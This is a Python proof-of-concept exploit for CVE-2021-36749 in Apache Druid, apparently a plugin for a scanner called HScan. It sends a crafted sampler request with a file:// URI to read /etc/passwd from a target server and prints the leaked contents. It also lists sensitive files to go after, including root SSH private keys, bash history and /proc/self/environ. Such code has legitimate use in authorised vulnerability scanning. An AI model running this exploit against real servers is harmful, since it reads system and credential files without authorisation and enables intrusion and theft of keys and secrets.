"""
CVE-2021-36749
源码来源：
https://github.com/dorkerdevil/CVE-2021-36749/blob/main/CVE-2021-36749.py
"""
import json

import requests

from HScan import main

# In the Druid ingestion system, the InputSource is used for reading data from a certain data source. However,
# the HTTP InputSource allows authenticated users to read data from other sources than intended, such as the local
# file system, with the privileges of the Druid server process. This is not an elevation of privilege when users
# access Druid directly, since Druid also provides the Local InputSource, which allows the same level of access. But
# it is problematic when users interact with Druid indirectly through an application that allows users to specify the
# HTTP InputSource, but not the Local InputSource. In this case, users could bypass the application-level restriction
# by passing a file URL to the HTTP InputSource. This issue was previously mentioned as being fixed in 0.21.0 as per
# CVE-2021-26920 but was not fixed in 0.21.0 or 0.21.1.

lists = [
    "/etc/passwd",
    "/etc/group",
    "/etc/hosts",
    "/etc/motd",
    "/etc/issue",
    "/etc/bashrc",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/ports.conf",
    "/etc/apache2/sites-available/default",
    "/etc/httpd/conf/httpd.conf",
    "/etc/httpd/conf.d",
    "/etc/httpd/logs/access.log",
    "/etc/httpd/logs/access_log",
    "/etc/httpd/logs/error.log",
    "/etc/httpd/logs/error_log",
    "/etc/init.d/apache2",
    "/etc/mysql/my.cnf",
    "/etc/nginx.conf",
    "/opt/lampp/logs/access_log",
    "/opt/lampp/logs/error_log",
    "/opt/lamp/log/access_log",
    "/opt/lamp/logs/error_log",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "/proc/mounts",
    "/proc/config.gz",
    "/root/.bashrc",
    "/root/.bash_history",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_rsa.keystore",
    "/root/.ssh/id_rsa.pub",
    "/root/.ssh/known_hosts",
]



def Apache_Druid_any_path(data, timeout=6,code='gbk'):
    url = data + '/druid/indexer/v1/sampler?for=connect'
    json_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    try:
        response = requests.post(url,  json=json_data, timeout=timeout, verify=False, allow_redirects=False)
        response_text = response.text
        if 'root:x:0' in response_text:
            main.print_green(f'CVE-2021-36749 ====> 存在漏洞 ====> {url}\n内容为:{response_text}')
    except Exception:
        pass

if __name__ == '__main__':
    Apache_Druid_any_path('')
